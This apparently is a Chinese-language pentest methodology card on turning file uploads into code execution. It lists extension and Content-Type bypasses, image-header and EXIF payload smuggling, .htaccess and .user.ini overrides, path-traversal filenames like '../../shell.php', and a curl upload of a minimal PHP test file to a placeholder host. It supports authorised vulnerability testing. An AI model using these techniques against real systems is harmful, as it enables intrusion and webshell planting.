---
id: tactics/upload-to-rce
type: tactic
tags: [upload, rce, 文件上传, 解析, webshell]
source: self
license: MIT
version: 1
updated: 2026-10-22
---

# 文件上传 → 执行：判定标准与检查顺序

**一句话结论**：上传成功不算漏洞，**服务端能解析并执行你上传的内容**才算；判定要靠"访问后返回了只有执行才会产生的东西"。

## 判定标准

**算命中**：
- 访问上传后的文件，执行了命令/函数并回显（`id` 输出、`phpinfo` 页面）
- 上传 `.htaccess`/`.user.ini`/`web.config` 后，**原本不能解析的扩展名**变成了可解析
- 路径穿越写到了 web 目录外（能覆盖已知文件并用内容变化验证）
- 上传后返回了可直接访问的 URL 且内容是原文（**只算"可存储"，不算 RCE**）

**不算命中**：
- 只是"上传成功"提示，访问 URL 404/403
- 只改了 `Content-Type` 就以为绕过了（要看是否真落到磁盘）
- 图片马未配套解析路径（没有包含点就是死文件）

## 检查顺序

1. **先找解析点**：上传目录是否可访问？是否有 `include`/`require` 点（LFI）？没有解析点的上传是纯存储。
2. **基线**：传一个正常 png，确认上传路径、返回结构、访问 URL。
3. **扩展名绕过**（按顺序，一次只改一个变量）：
   `php` → `php5/phtml/phar/pht` → `.php.jpg` / `1.php;.jpg` / `1.php%00.jpg`(老版本) → 大小写 `PhP` → 双写 `pphphp` → 尾部空格/点（Windows）
4. **Content-Type**：`image/png` 但内容是 PHP；`multipart` 里改 `filename` 与 `Content-Type` 不一致。
5. **内容校验绕过**：GIF89a 头 + PHP；EXIF 里塞 payload；二次渲染（GD 重编码）后仍保留 payload 的位置。
6. **配置覆盖**：`.htaccess`（`AddType application/x-httpd-php .jpg`）、`.user.ini`（`auto_prepend_file`）、`web.config`（IIS）。
7. **路径穿越**：`filename=../../shell.php`、`filename=..%2f..%2fshell.php`。
8. **配套利用**：找到 LFI/包含点 → 包含上传的图片马；或找到反序列化点 → `phar://` 触发。

## 最小验证

```bash
# 传一个最小 php（不要传大马）
printf '<?php echo "ARTEX".(7*7); ?>' > a.php
curl -s -F "file=@a.php;type=image/png;filename=a.php.jpg" "http://TARGET/upload"
# 关键：访问后应看到 ARTEX49，说明被解析执行
curl -s "http://TARGET/uploads/a.php.jpg"
```

## 失败即停

- 5 种扩展名 + 2 种 Content-Type 都不落盘 → 判定上传校验较严，转去测**路径穿越 / 配置覆盖**，别再换后缀。
- 上传成功但目录不可访问、且没有包含点 → 记 fact「可存储、无解析」，**不是漏洞**，换方向。
- 同一上传点累计 2 轮无增量 → 交顾问换层。

## 关联

- LFI 组合：`tactics/access-control.md`（越权拿文件读取接口）
- payload：`payloads/minimal-web.md`
